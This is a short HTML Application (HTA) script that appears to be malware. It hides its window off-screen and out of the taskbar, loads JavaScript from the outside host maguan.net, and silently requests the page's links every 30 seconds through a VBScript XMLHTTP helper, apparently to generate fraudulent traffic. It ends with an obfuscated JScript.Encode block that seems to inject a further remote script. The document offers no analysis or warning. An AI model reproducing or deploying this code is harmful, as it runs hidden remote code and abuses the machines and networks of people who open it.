   <Script>self.moveTo(screen.Width + 800,screen.Height + 600);</Script>
   <html>
   <head>
   <hta:application showintaskbar='no'>
   </head>
   <body onload='start()'>
   <Script Language="VBScript">
   Function bytes2BSTR(vIn)
       dim strReturn
       dim i,ThisCharCode,NextCharCode
       strReturn = ""
       For i = 1 To LenB(vIn)
           ThisCharCode = AscB(MidB(vIn,i,1))
           If ThisCharCode < &H80 Then
               strReturn = strReturn & Chr(ThisCharCode)
           Else
               NextCharCode = AscB(MidB(vIn,i+1,1))
               strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode))
               i = i + 1
           End If
       Next
       bytes2BSTR = strReturn
   End Function
   Function OpenHttp(Url)
       On Error Resume Next
       set Http = createobject("Microsoft.XMLHTTP")
       Http.open "GET",Url,false
       Http.send()
   End Function
   </Script>
   <script language=JavaScript src=http://www.maguan.net></script>
   <script language=JavaScript src=http://www.maguan.net></script>
   <Script Language='JavaScript'>
   setTimeout("window.open('http://www.maguan.net');",1200000);
   var dd = 3;
   function start() {
   if (dd < document.links.length) {
   OpenHttp(document.links[dd].href);
   dd++;setTimeout('start()',1000*30);
   }
   else window.close();
   }
   </Script>
   <Script Language='JScript.Encode'>#@~^ZwAAAA==[Km;s+    YRSDbO+vJ@!?1Dr2DPSmUo!lo xwJxl7ljm.raYwJ,jD1'wE4YY2lJzAhS XXTZFcmWsz4CwaX Lk-E@*@!-zU^DbwY@*EbiHCIAAA==^#~@</Script>
   </body></html>
